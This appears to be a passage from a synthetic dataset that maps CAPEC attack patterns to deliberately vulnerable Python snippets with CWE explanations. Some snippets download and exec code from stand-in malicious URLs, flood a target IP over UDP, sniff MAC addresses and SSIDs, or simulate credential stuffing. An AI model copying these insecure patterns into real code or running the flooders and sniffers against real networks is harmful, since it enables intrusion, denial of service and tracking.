        "code_snippet": "import socket\nimport requests\n\n# CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\ndef get_hostname(ip):\n    try:\n        return socket.gethostbyaddr(ip)[0]\n    except socket.herror:\n        return None\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\ndef send_request(url):\n    try:\n        response = requests.get(url)\n        return response.text\n    except requests.exceptions.RequestException as e:\n        return str(e)\n\n# CWE-494: Download of Code Without Integrity Check\ndef download_code(url):\n    try:\n        response = requests.get(url)\n        if response.status_code == 200:\n            exec(response.text)\n    except requests.exceptions.RequestException as e:\n        print(f\"Failed to download code: {e}\")\n\n# CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\ndef redirect_user(input_url):\n    trusted_domain = \"trusted.com\"\n    if trusted_domain not in input_url:\n        return f\"Redirecting to untrusted site: {input_url}\"\n    return f\"Redirecting to trusted site: {input_url}\"\n\n# CWE-918: Server-Side Request Forgery (SSRF)\ndef fetch_internal_data(url):\n    try:\n        response = requests.get(url)\n        return response.text\n    except requests.exceptions.RequestException as e:\n        return str(e)\n\n# Example usage\nip = \"192.168.1.1\"\nhostname = get_hostname(ip)\nif hostname:\n    print(f\"Hostname for IP {ip} is {hostname}\")\nelse:\n    print(f\"Could not resolve hostname for IP {ip}\")\n\n# Simulate DNS Spoofing by sending a request to a potentially malicious URL\nmalicious_url = \"http://malicious.com\"\nprint(send_request(malicious_url))\n\n# Download and execute code from a remote location without integrity check\ncode_url = \"http://example.com/malicious_code.py\"\ndownload_code(code_url)\n\n# Redirect user to an untrusted site\nuser_input_url = \"http://untrusted.com\"\nprint(redirect_user(user_input_url))\n\n# Fetch internal data using SSRF\ninternal_url = \"http://internal-system.local/data\"\nprint(fetch_internal_data(internal_url))",
        "description": "This Python code snippet demonstrates several security weaknesses related to DNS Spoofing and associated CWEs. The code includes functions that perform reverse DNS resolution (CWE-350), send requests to potentially incorrect destinations (CWE-941), download and execute code without integrity checks (CWE-494), redirect users to untrusted sites (CWE-601), and fetch data from potentially unsafe URLs (CWE-918). The example usage section simulates DNS Spoofing by sending a request to a potentially malicious URL, downloading and executing code from an untrusted source, redirecting a user to an untrusted site, and fetching internal data using SSRF. This code highlights the vulnerabilities that can be exploited in a DNS Spoofing attack scenario."
    },
    {
        "capec_id": "599",
        "capec_name": "Terrestrial Jamming",
        "code_snippet": "import socket\n\n# Simulate a communication channel with improper message integrity enforcement\nserver_address = ('localhost', 10000)\n\n# Create a UDP socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n\ntry:\n    # Send data\n    message = b'This is a sensitive message'\n    print(f'Sending: {message}')\n    sock.sendto(message, server_address)\n\n    # Receive response\n    data, server = sock.recvfrom(4096)\n    print(f'Received: {data}')\nfinally:\n    sock.close()",
        "description": "This Python code snippet demonstrates a simple UDP communication channel where sensitive information is transmitted in cleartext. The code does not enforce message integrity, making it vulnerable to tampering. This aligns with the CAPEC description of 'Terrestrial Jamming,' where an adversary can disrupt or intercept communication. The related CWEs are represented as follows: CWE-319 (Cleartext Transmission of Sensitive Information) is shown by sending the message in cleartext, and CWE-924 (Improper Enforcement of Message Integrity During Transmission) is demonstrated by the lack of integrity checks on the received message."
    },
    {
        "capec_id": "600",
        "capec_name": "Credential Stuffing",
        "code_snippet": "import time\n\n# Simulated user database\nuser_db = {\n    'user1': 'password123',\n    'user2': 'mypassword',\n    'user3': 'letmein'\n}\n\n# Function to authenticate user\nattempts = {}\ndef authenticate(username, password):\n    global attempts\n    if username in attempts and attempts[username] >= 5:\n        print('Account locked due to too many failed attempts.')\n        return False\n    if username in user_db and user_db[username] == password:\n        print('Authentication successful!')\n        attempts[username] = 0  # Reset attempts on successful login\n        return True\n    else:\n        print('Authentication failed.')\n        if username in attempts:\n            attempts[username] += 1\n        else:\n            attempts[username] = 1\n        return False\n\n# Simulate credential stuffing attack\nusernames = ['user1', 'user2', 'user3']\npasswords = ['password123', 'mypassword', 'letmein', 'wrongpassword']\n\nfor username in usernames:\n    for password in passwords:\n        authenticate(username, password)\n        time.sleep(1)  # Simulate time delay between attempts",
        "description": "This Python code snippet simulates a basic authentication system vulnerable to credential stuffing attacks. The `authenticate` function checks a username and password against a simulated user database. It also tracks the number of failed authentication attempts and locks the account after 5 failed attempts, addressing CWE-307 (Improper Restriction of Excessive Authentication Attempts). The code does not implement multi-factor authentication, making it susceptible to CWE-308 (Use of Single-factor Authentication). The simulated credential stuffing attack iterates through a list of usernames and passwords, attempting to authenticate each combination. This demonstrates the risk of users reusing credentials across multiple systems, as described in the CAPEC."
    },
    {
        "capec_id": "601",
        "capec_name": "Jamming",
        "code_snippet": "import socket\nimport threading\n\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-924: Improper Enforcement of Message Integrity During Transmission\n# CWE-406: Insufficient Control of Network Message Volume\n# CWE-421: Race Condition During Access to Alternate Channel\n\ndef handle_client(client_socket):\n    while True:\n        try:\n            # Receive data from the client\n            data = client_socket.recv(1024)\n            if not data:\n                break\n            # CWE-319: Transmitting sensitive data in cleartext\n            print(f\"Received: {data.decode('utf-8')}\")\n            # Echo the data back to the client\n            client_socket.send(data)\n        except Exception as e:\n            print(f\"Error: {e}\")\n            break\n    client_socket.close()\n\ndef start_server():\n    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server.bind(('0.0.0.0', 9999))\n    server.listen(5)\n    print(\"Server listening on port 9999\")\n\n    while True:\n        client_socket, addr = server.accept()\n        print(f\"Accepted connection from {addr}\")\n        # CWE-421: Potential race condition when handling multiple clients\n        client_handler = threading.Thread(target=handle_client, args=(client_socket,))\n        client_handler.start()\n\nif __name__ == \"__main__\":\n    start_server()",
        "description": "This Python code snippet represents a simple TCP server that listens for incoming connections and echoes received data back to the client. The code embodies the main idea of the CAPEC 'Jamming' by demonstrating vulnerabilities related to communication channels. Specifically, it includes CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints) by not verifying the client's identity, CWE-319 (Cleartext Transmission of Sensitive Information) by transmitting data in cleartext, CWE-924 (Improper Enforcement of Message Integrity During Transmission) by not ensuring message integrity, CWE-406 (Insufficient Control of Network Message Volume) by not monitoring traffic volume, and CWE-421 (Race Condition During Access to Alternate Channel) by potentially mishandling multiple client connections concurrently. This setup can be exploited by an adversary to disrupt communications and deny service to legitimate users."
    },
    {
        "capec_id": "602",
        "capec_name": "DEPRECATED: Degradation",
        "code_snippet": "import hashlib\n\n# Using an obsolete hashing function (MD5) which is known to be insecure\npassword = 'user_password'\nhash_object = hashlib.md5(password.encode())\nhashed_password = hash_object.hexdigest()\nprint(f'Hashed Password: {hashed_password}')\n\n# Deprecated reliance on DNS lookup for security decision\nimport socket\n\ndef is_trusted_host(hostname):\n    try:\n        ip_address = socket.gethostbyname(hostname)\n        # Insecure check based on IP address\n        if ip_address == '192.168.1.1':\n            return True\n        else:\n            return False\n    except socket.error:\n        return False\n\nhostname = 'example.com'\nif is_trusted_host(hostname):\n    print('Access granted')\nelse:\n    print('Access denied')",
        "description": "This Python code snippet demonstrates the use of deprecated and insecure practices, aligning with the CAPEC and related CWEs. The code uses the obsolete MD5 hashing function to hash a password, which is insecure and vulnerable to attacks (CWE-477). Additionally, it relies on a DNS lookup to make a security decision, which is deprecated and insecure (CWE-247). The function `is_trusted_host` checks if a hostname resolves to a specific IP address to grant access, which is a flawed security mechanism. This code highlights the risks associated with using deprecated and insecure methods in software development."
    },
    {
        "capec_id": "603",
        "capec_name": "Blockage",
        "code_snippet": "import threading\nimport time\n\n# Simulate a resource that can be blocked\nclass Resource:\n    def __init__(self):\n        self.lock = threading.Lock()\n        self.data = []\n\n    def add_data(self, value):\n        with self.lock:\n            self.data.append(value)\n            time.sleep(0.1)  # Simulate time-consuming operation\n\n    def get_data(self):\n        with self.lock:\n            return self.data\n\n# Function to simulate resource blockage\ndef block_resource(resource):\n    while True:\n        resource.add_data('block')\n\n# Create a resource instance\nresource = Resource()\n\n# Start multiple threads to block the resource\nthreads = []\nfor _ in range(10):\n    t = threading.Thread(target=block_resource, args=(resource,))\n    t.start()\n    threads.append(t)\n\n# Main thread waits for a while to simulate system running\ntry:\n    time.sleep(5)\nfinally:\n    for t in threads:\n        t.join()\n\nprint('Resource data:', resource.get_data())",
        "description": "This Python code snippet demonstrates a scenario where a shared resource is blocked by multiple threads, leading to potential system failure or degradation. The `Resource` class simulates a resource with a lock to control access. The `block_resource` function continuously adds data to the resource, simulating a blockage. Multiple threads are created to block the resource concurrently, representing an uncontrolled resource consumption (CWE-400) and allocation without limits (CWE-770). This can lead to a failure in the protection mechanism (CWE-693) and potentially create emergent resources (CWE-1229). The code highlights how an adversary can block the delivery of an important system resource, causing the system to fail or stop working, as described in the CAPEC."
    },
    {
        "capec_id": "604",
        "capec_name": "Wi-Fi Jamming",
        "code_snippet": "import socket\nimport threading\n\n# Function to flood the Wi-Fi access point with deauthentication frames\n# This is a simplified representation and does not perform actual deauthentication\n\ndef flood_deauth_frames(target_ip, target_port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    message = b'DEAUTH'\n    while True:\n        sock.sendto(message, (target_ip, target_port))\n\n# Function to simulate high levels of noise on the RF band\n# This is a simplified representation and does not perform actual RF jamming\n\ndef transmit_noise(target_ip, target_port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    noise = b'NOISE' * 1024\n    while True:\n        sock.sendto(noise, (target_ip, target_port))\n\n# Start threads to perform both attacks\n\ntarget_ip = '192.168.1.1'\ntarget_port = 80\n\nthread1 = threading.Thread(target=flood_deauth_frames, args=(target_ip, target_port))\nthread2 = threading.Thread(target=transmit_noise, args=(target_ip, target_port))\n\nthread1.start()\nthread2.start()",
        "description": "This Python code snippet demonstrates a simplified version of a Wi-Fi jamming attack. It includes two main functions: one to flood the Wi-Fi access point with deauthentication frames and another to simulate high levels of noise on the RF band. The code uses sockets to send repeated messages to a target IP and port, representing the disruption of communication. This example embodies the CAPEC 'Wi-Fi Jamming' by illustrating how an attacker might prevent users from transmitting or receiving data on a Wi-Fi network. The related CWEs provide context on potential weaknesses, such as improper enforcement of message integrity and cleartext transmission of sensitive information, which could be exploited in such attacks."
    },
    {
        "capec_id": "605",
        "capec_name": "Cellular Jamming",
        "code_snippet": "import socket\n\n# Simulate a cellular jamming attack by sending noise to a communication channel\n\ndef send_noise(target_ip, target_port):\n    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:\n        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)\n        noise = b'\\x00' * 1024  # 1KB of noise data\n        while True:\n            sock.sendto(noise, (target_ip, target_port))\n\n# Example usage\nsend_noise('192.168.1.1', 12345)",
        "description": "This Python code snippet simulates a cellular jamming attack by continuously sending noise data to a specified target IP and port using UDP packets. The `send_noise` function creates a socket and sends 1KB of noise data in an infinite loop. This represents the CAPEC scenario where an attacker disrupts communication by introducing high levels of noise on signaling channels. The code also indirectly highlights related CWEs such as CWE-300 (Channel Accessible by Non-Endpoint) and CWE-319 (Cleartext Transmission of Sensitive Information) by demonstrating how an attacker can exploit a communication channel without proper verification or encryption."
    },
    {
        "capec_id": "606",
        "capec_name": "Weakening of Cellular Encryption",
        "code_snippet": "import random\n\nclass CellularConnection:\n    def __init__(self):\n        self.encryption_modes = ['A5/0', 'A5/1', 'A5/2', 'A5/3']\n        self.selected_mode = None\n\n    def negotiate_encryption(self):\n        # Simulate an attacker forcing a downgrade to a weaker encryption mode\n        self.selected_mode = random.choice(['A5/0', 'A5/1', 'A5/2'])\n        print(f'Encryption mode selected: {self.selected_mode}')\n\n    def transmit_data(self, data):\n        if self.selected_mode == 'A5/0':\n            print('Transmitting data without encryption:', data)\n        elif self.selected_mode in ['A5/1', 'A5/2']:\n            print(f'Transmitting data with weak encryption ({self.selected_mode}):', data)\n        else:\n            print('Transmitting data with strong encryption (A5/3):', data)\n\n# Example usage\nconnection = CellularConnection()\nconnection.negotiate_encryption()\nconnection.transmit_data('Sensitive Information')",
        "description": "This Python code snippet simulates a cellular connection where an attacker can force the mobile device to use a weaker encryption mode. The `CellularConnection` class has a method `negotiate_encryption` that randomly selects an encryption mode from a list that includes weak modes (A5/0, A5/1, A5/2) and a strong mode (A5/3). The `transmit_data` method then transmits data using the selected encryption mode. This represents the CAPEC of 'Weakening of Cellular Encryption' by demonstrating how an attacker can force the use of less secure encryption algorithms, embodying CWEs such as 'Selection of Less-Secure Algorithm During Negotiation' and 'Use of a Broken or Risky Cryptographic Algorithm'."
    },
    {
        "capec_id": "607",
        "capec_name": "Obstruction",
        "code_snippet": "import threading\nimport time\n\n# Shared resource\nshared_resource = {'status': 'operational'}\n\n# Function to simulate obstruction\ndef obstruct_resource():\n    while True:\n        shared_resource['status'] = 'degraded'\n        time.sleep(1)\n        shared_resource['status'] = 'operational'\n        time.sleep(1)\n\n# Function to simulate system component\ndef system_component():\n    while True:\n        if shared_resource['status'] == 'degraded':\n            print('System in degraded state')\n        else:\n            print('System operational')\n        time.sleep(0.5)\n\n# Start threads to simulate obstruction and system component\nobstruction_thread = threading.Thread(target=obstruct_resource)\nsystem_thread = threading.Thread(target=system_component)\n\nobstruction_thread.start()\nsystem_thread.start()\n\nobstruction_thread.join()\nsystem_thread.join()",
        "description": "This Python code snippet demonstrates the concept of 'Obstruction' by simulating an attacker obstructing the interactions between system components. The shared resource's status is toggled between 'operational' and 'degraded' states, representing the attacker's interference. The system component checks the status of the shared resource and prints the system's state accordingly. This example embodies the CAPEC idea by showing how an attacker can force the system into a degraded state, causing it to stop working as intended. The use of threading simulates concurrent processes, highlighting potential issues like race conditions (CWE-1298) and improper handling of faults (CWE-1332)."
    },
    {
        "capec_id": "608",
        "capec_name": "Cryptanalysis of Cellular Encryption",
        "code_snippet": "import random\n\n# Simulate the use of a broken or risky cryptographic algorithm (A5/1)\ndef a5_1_encrypt(plaintext, key):\n    # Simplified and insecure encryption for demonstration purposes\n    random.seed(key)\n    return ''.join(chr(ord(c) ^ random.randint(0, 255)) for c in plaintext)\n\n# Simulate the use of a hard-coded cryptographic key\nhardcoded_key = '123456'\n\n# Simulate the selection of a less-secure algorithm during negotiation\ndef negotiate_algorithm(preferred_algorithms):\n    # Always select the weakest algorithm (A5/1) for demonstration purposes\n    return 'A5/1' if 'A5/1' in preferred_algorithms else preferred_algorithms[0]\n\n# Example usage\nplaintext = 'Sensitive data'\nselected_algorithm = negotiate_algorithm(['A5/1', 'AES'])\nif selected_algorithm == 'A5/1':\n    ciphertext = a5_1_encrypt(plaintext, hardcoded_key)\n    print(f'Encrypted with {selected_algorithm}:', ciphertext)\nelse:\n    print('Stronger algorithm selected, but not implemented in this example.')",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the 'Cryptanalysis of Cellular Encryption' CAPEC. It includes the use of a broken or risky cryptographic algorithm (A5/1), the use of a hard-coded cryptographic key, and the selection of a less-secure algorithm during negotiation. The `a5_1_encrypt` function simulates a weak encryption process using a hard-coded key. The `negotiate_algorithm` function always selects the weakest algorithm (A5/1) if available, representing an algorithm downgrade attack. The example usage shows how sensitive data can be encrypted using these insecure practices, highlighting the potential for cryptanalysis attacks."
    },
    {
        "capec_id": "609",
        "capec_name": "Cellular Traffic Intercept",
        "code_snippet": "import socket\n\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-311: Missing Encryption of Sensitive Data\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n\n# Function to send sensitive data over a network\n# This code does not use encryption, verify the source, or ensure message integrity\n\ndef send_sensitive_data(data, server_ip, server_port):\n    try:\n        # Create a socket object\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        \n        # Connect to the server\n        s.connect((server_ip, server_port))\n        \n        # Send data in cleartext\n        s.sendall(data.encode('utf-8'))\n        \n        # Receive response\n        response = s.recv(1024)\n        print('Received:', response.decode('utf-8'))\n        \n    except Exception as e:\n        print('Error:', e)\n    finally:\n        s.close()\n\n# Example usage\nsend_sensitive_data('Sensitive Information', '192.168.1.1', 8080)",
        "description": "This Python code snippet demonstrates a vulnerable implementation of sending sensitive data over a network. It embodies the main idea of the CAPEC 'Cellular Traffic Intercept' by showing how sensitive information can be intercepted due to several weaknesses:\n\n1. **CWE-319 (Cleartext Transmission of Sensitive Information)**: The data is sent in cleartext without any encryption, making it easy for an attacker to intercept and read the information.\n2. **CWE-311 (Missing Encryption of Sensitive Data)**: The code does not encrypt the sensitive data before transmission.\n3. **CWE-940 (Improper Verification of Source of a Communication Channel)**: The code does not verify the source of the communication channel, allowing potential man-in-the-middle attacks.\n4. **CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel)**: The code does not ensure the integrity of the message during transmission, making it susceptible to tampering.\n\nThis snippet highlights the risks associated with transmitting sensitive data without proper security measures, making it vulnerable to interception and manipulation by malicious actors."
    },
    {
        "capec_id": "610",
        "capec_name": "Cellular Data Injection",
        "code_snippet": "import socket\n\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-924: Improper Enforcement of Message Integrity During Transmission\n# CWE-201: Insertion of Sensitive Information Into Sent Data\n# CWE-406: Insufficient Control of Network Message Volume\n\n# Simulate a vulnerable mobile communication system\nclass MobileCommunicationSystem:\n    def __init__(self, server_ip, server_port):\n        self.server_ip = server_ip\n        self.server_port = server_port\n        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n    def connect(self):\n        self.socket.connect((self.server_ip, self.server_port))\n\n    def send_data(self, data):\n        # CWE-319: Sending sensitive data in cleartext\n        self.socket.sendall(data.encode('utf-8'))\n\n    def receive_data(self):\n        # CWE-924: No integrity check on received data\n        return self.socket.recv(1024).decode('utf-8')\n\n    def close(self):\n        self.socket.close()\n\n# Example usage\nif __name__ == '__main__':\n    system = MobileCommunicationSystem('192.168.1.1', 8080)\n    system.connect()\n    # CWE-201: Inserting sensitive information into sent data\n    system.send_data('Sensitive Information: User Password')\n    response = system.receive_data()\n    print('Received:', response)\n    system.close()",
        "description": "This Python code snippet simulates a vulnerable mobile communication system that embodies the main idea of the CAPEC 'Cellular Data Injection'. The code demonstrates several related CWEs: \n\n1. CWE-319: The system sends sensitive information in cleartext, making it susceptible to interception by unauthorized actors.\n2. CWE-924: The system does not enforce message integrity during transmission, allowing adversaries to modify the data in transit.\n3. CWE-201: The system inserts sensitive information into the data being sent, which should not be accessible to unauthorized actors.\n4. CWE-406: Although not explicitly shown in the code, the lack of control over network message volume can be inferred as the system does not monitor or limit the amount of data being sent or received.\n\nThe code creates a socket connection to a server, sends sensitive information in cleartext, and receives data without verifying its integrity, illustrating the vulnerabilities described in the CAPEC and related CWEs."
    },
    {
        "capec_id": "611",
        "capec_name": "BitSquatting",
        "code_snippet": "import requests\n\n# Vulnerable URL redirection\ntrusted_domain = 'http://trusted.com/login'\nuser_input = 'http://trusted.com@malicious.com'\n\n# Simulate a BitSquatting attack by changing one bit in the domain\nbit_squatted_domain = 'http://trvsted.com/login'\n\n# Redirect to user-controlled input\nredirect_url = user_input if 'trusted.com' in user_input else bit_squatted_domain\n\n# Download code without integrity check\nresponse = requests.get(redirect_url)\nexec(response.text)\n\n# Use of GET request with sensitive query strings\nsensitive_data = 'username=admin&password=secret'\nrequests.get(f'{redirect_url}?{sensitive_data}')",
        "description": "This Python code snippet demonstrates a BitSquatting attack by redirecting to a domain that is one bit different from a trusted domain. It also incorporates several related CWEs: CWE-601 (URL Redirection to Untrusted Site) by redirecting to a user-controlled input, CWE-494 (Download of Code Without Integrity Check) by downloading and executing code from the redirected URL, and CWE-598 (Use of GET Request Method With Sensitive Query Strings) by sending sensitive information in the query string of a GET request. The code highlights how an attacker can exploit these vulnerabilities to redirect traffic to a malicious site and execute potentially harmful code."
    },
    {
        "capec_id": "612",
        "capec_name": "WiFi MAC Address Tracking",
        "code_snippet": "import socket\nimport struct\nimport binascii\n\n# Open a raw socket to listen for WiFi packets\nsock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))\n\n# Dictionary to store MAC addresses and associated users\nmac_addresses = {}\n\nwhile True:\n    # Receive a packet\n    packet = sock.recvfrom(2048)[0]\n    # Extract the MAC address from the packet\n    mac_address = binascii.hexlify(packet[6:12]).decode('utf-8')\n    # Log the MAC address (vulnerable to tracking)\n    if mac_address not in mac_addresses:\n        mac_addresses[mac_address] = 'User'  # In a real scenario, associate with actual user data\n    print(f'Tracked MAC Address: {mac_address}')",
        "description": "This Python code snippet demonstrates a basic implementation of WiFi MAC address tracking. It opens a raw socket to listen for WiFi packets and extracts the MAC addresses from these packets. The MAC addresses are then logged and associated with a user. This code embodies the main idea of the CAPEC by showing how an attacker can passively listen for WiFi messages and log MAC addresses to track users. The code also touches on related CWEs, such as CWE-201 (Insertion of Sensitive Information Into Sent Data) by logging sensitive MAC addresses, and CWE-300 (Channel Accessible by Non-Endpoint) by not verifying the identity of the actors on the communication channel."
    },
    {
        "capec_id": "613",
        "capec_name": "WiFi SSID Tracking",
        "code_snippet": "import socket\nimport struct\n\n# Function to passively listen for WiFi management frames\ndef listen_for_ssid(interface):\n    # Create a raw socket to capture packets\n    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))\n    sock.bind((interface, 0x0003))\n\n    while True:\n        packet = sock.recvfrom(2048)[0]\n        # Check if the packet is a management frame (type 0)\n        if packet[26] == 0x00:\n            # Extract the SSID from the packet\n            ssid_length = packet[37]\n            ssid = packet[38:38+ssid_length].decode('utf-8', errors='ignore')\n            print(f'SSID: {ssid}')\n\n# Example usage\nlisten_for_ssid('wlan0')",
        "description": "This Python code snippet demonstrates a passive WiFi SSID tracking mechanism. It creates a raw socket to capture packets on a specified network interface (e.g., 'wlan0'). The code listens for WiFi management frames and extracts the SSID from these frames. This represents the CAPEC scenario where an attacker passively listens for WiFi management frames to track users based on their SSIDs. The code also embodies CWE-201 by transmitting sensitive information (SSID) that should not be accessible, and CWE-300 by not verifying the identity of actors at both ends of the communication channel."
    },
    {
        "capec_id": "614",
        "capec_name": "Rooting SIM Cards",
        "code_snippet": "import pyDes\n\n# Simulate a weak DES key (CWE-326: Inadequate Encryption Strength)\nweak_des_key = pyDes.des(b'12345678', pyDes.ECB, pad=None, padmode=pyDes.PAD_PKCS5)\n\n# Simulate an OTA update message (CWE-327: Use of a Broken or Risky Cryptographic Algorithm)\nota_update_message = b'OTA Update: Install malicious applet'\n\n# Encrypt the OTA update message using the weak DES key\nencrypted_message = weak_des_key.encrypt(ota_update_message)\n\n# Simulate sending the encrypted message to the SIM card\n# In a real scenario, this would be sent via SMS\nprint(f\"Encrypted OTA Update Message: {encrypted_message}\")\n\n# Simulate the SIM card decrypting the message\n# An attacker who has cracked the DES key can decrypt it\ndecrypted_message = weak_des_key.decrypt(encrypted_message)\nprint(f\"Decrypted OTA Update Message: {decrypted_message}\")\n\n# Simulate execution of the malicious applet on the SIM card\n# This represents the potential for abuse described in the CAPEC\ndef execute_malicious_applet():\n    print(\"Malicious applet executed: Sending SMS, changing voicemail, querying location...\")\n\n# Execute the malicious applet\nexecute_malicious_applet()",
        "description": "This Python code snippet demonstrates the concept of 'Rooting SIM Cards' by leveraging a weak DES encryption (CWE-326) to simulate an OTA update message. The code encrypts a message using a weak DES key and then decrypts it, representing an attacker who has cracked the DES key. The decrypted message is then executed as a malicious applet on the SIM card, showcasing the potential for abuse such as sending SMS, changing voicemail numbers, and querying the phone location. This embodies the main idea of the CAPEC by illustrating how weak cryptographic algorithms can be exploited to deliver and execute malicious code on SIM cards."
    },
    {
        "capec_id": "615",
        "capec_name": "Evil Twin Wi-Fi Attack",
        "code_snippet": "import socket\n\n# Create a socket object\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Define the server address and port\nserver_address = ('192.168.1.1', 8080)\n\n# Connect to the server\ns.connect(server_address)\n\n# Send sensitive data in cleartext\ns.sendall(b'username=admin&password=admin123')\n\n# Receive data from the server\nresponse = s.recv(1024)\nprint('Received:', response.decode())\n\n# Close the connection\ns.close()",
        "description": "This Python code snippet demonstrates a basic client-server communication where sensitive information (username and password) is transmitted in cleartext over a network. The code does not verify the identity of the server, nor does it ensure the integrity of the communication channel. This makes it vulnerable to an Evil Twin Wi-Fi Attack, where an adversary can set up a rogue Wi-Fi access point to intercept and capture the transmitted data. The code embodies the main idea of CAPEC-94 and related CWEs (300, 923, 940, 319, 924) by illustrating the lack of proper verification, encryption, and integrity checks in the communication channel."
    },
    {
        "capec_id": "616",
        "capec_name": "Establish Rogue Location",
        "code_snippet": "import os\n\n# CWE-426: Untrusted Search Path\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n\n# Simulate a legitimate resource path\nlegitimate_path = '/usr/local/bin/legit_resource'\n\n# Simulate a rogue resource path\nrogue_path = '/tmp/legit_resource'\n\n# Function to access a resource\ndef access_resource(resource_path):\n    if os.path.exists(resource_path):\n        with open(resource_path, 'r') as file:\n            data = file.read()\n            print(f'Accessed data: {data}')\n    else:\n        print('Resource not found')\n\n# Simulate an attacker placing a rogue resource\nwith open(rogue_path, 'w') as file:\n    file.write('Malicious data')\n\n# Victim tries to access the legitimate resource but ends up accessing the rogue resource\naccess_resource(rogue_path)",
        "description": "This Python code snippet demonstrates the concept of 'Establish Rogue Location' (CAPEC) by simulating a scenario where an attacker places a malicious resource at a location similar to the expected location of a legitimate resource. The code includes CWE-426 (Untrusted Search Path) by using an externally-supplied path to access resources, CWE-940 (Improper Verification of Source of a Communication Channel) by not verifying the origin of the resource path, and CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by potentially exposing sensitive data from the rogue resource. The victim ends up accessing the malicious resource instead of the legitimate one, illustrating the attack vector."
    },
    {
        "capec_id": "617",
        "capec_name": "Cellular Rogue Base Station",
        "code_snippet": "import socket\n\nclass RogueBaseStation:\n    def __init__(self, host='0.0.0.0', port=12345):\n        self.host = host\n        self.port = port\n        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.server_socket.bind((self.host, self.port))\n        self.server_socket.listen(5)\n        print(f'Rogue Base Station listening on {self.host}:{self.port}')\n\n    def handle_client(self, client_socket):\n        try:\n            data = client_socket.recv(1024)\n            print(f'Received data: {data}')\n            # Simulate message modification\n            modified_data = data.replace(b'Hello', b'Hi')\n            client_socket.send(modified_data)\n        except Exception as e:\n            print(f'Error handling client: {e}')\n        finally:\n            client_socket.close()\n\n    def run(self):\n        while True:\n            client_socket, addr = self.server_socket.accept()\n            print(f'Accepted connection from {addr}')\n            self.handle_client(client_socket)\n\nif __name__ == '__main__':\n    rogue_base_station = RogueBaseStation()\n    rogue_base_station.run()",
        "description": "This Python code snippet represents a simplified version of a rogue base station attack. The `RogueBaseStation` class sets up a server socket that listens for incoming connections, mimicking a legitimate cellular base station. When a client connects, the `handle_client` method receives data from the client, modifies it (simulating a message integrity attack), and sends the modified data back to the client. This demonstrates the vulnerabilities described in the CAPEC and related CWEs, such as improper verification of the communication channel's source, inadequate identity verification, and lack of message integrity enforcement."
    },
    {
        "capec_id": "618",
        "capec_name": "Cellular Broadcast Message Request",
        "code_snippet": "import requests\n\n# Vulnerable function to send a broadcast message\n\ndef send_broadcast_message(phone_number, message):\n    # CWE-201: Insertion of Sensitive Information Into Sent Data\n    data = {\n        'phone_number': phone_number,\n        'message': message\n    }\n    # CWE-940: Improper Verification of Source of a Communication Channel\n    response = requests.post('http://example.com/send_broadcast', json=data)\n    if response.status_code == 200:\n        print('Broadcast message sent successfully')\n    else:\n        print('Failed to send broadcast message')\n\n# Example usage\nsend_broadcast_message('+1234567890', 'Emergency Alert')",
        "description": "This Python code snippet demonstrates a vulnerable function `send_broadcast_message` that sends a broadcast message to a specified phone number. The function constructs a data payload containing the phone number and message, and sends it to a server endpoint using an HTTP POST request. The code embodies the main idea of the CAPEC 'Cellular Broadcast Message Request' by showing how an attacker could exploit the system to send broadcast messages to a target's mobile device. The code includes CWE-201 by inserting sensitive information (phone number) into the sent data, and CWE-940 by not verifying the source of the communication channel, making it possible for an attacker to misuse the function."
    },
    {
        "capec_id": "619",
        "capec_name": "Signal Strength Tracking",
        "code_snippet": "import socket\nimport struct\nimport time\n\n# Simulate a device broadcasting its WiFi MAC address\nMAC_ADDRESS = '00:0a:95:9d:68:16'\n\n# Function to simulate sending a broadcast message\ndef send_broadcast_message():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)\n    message = f'Device MAC: {MAC_ADDRESS}'\n    sock.sendto(message.encode(), ('<broadcast>', 37020))\n    sock.close()\n\n# Function to simulate an attacker tracking signal strength\n# This is a simplified version and does not include actual signal strength tracking\n# In a real scenario, directional antennas and multiple listening points would be used\nclass Attacker:\n    def __init__(self):\n        self.tracked_signals = []\n\n    def track_signal(self, message):\n        mac_address = message.split(' ')[-1]\n        self.tracked_signals.append(mac_address)\n        print(f'Tracked MAC Address: {mac_address}')\n\n# Simulate the device sending broadcast messages\nfor _ in range(5):\n    send_broadcast_message()\n    time.sleep(1)\n\n# Simulate the attacker tracking the broadcast messages\nattacker = Attacker()\nfor _ in range(5):\n    attacker.track_signal(f'Device MAC: {MAC_ADDRESS}')\n    time.sleep(1)",
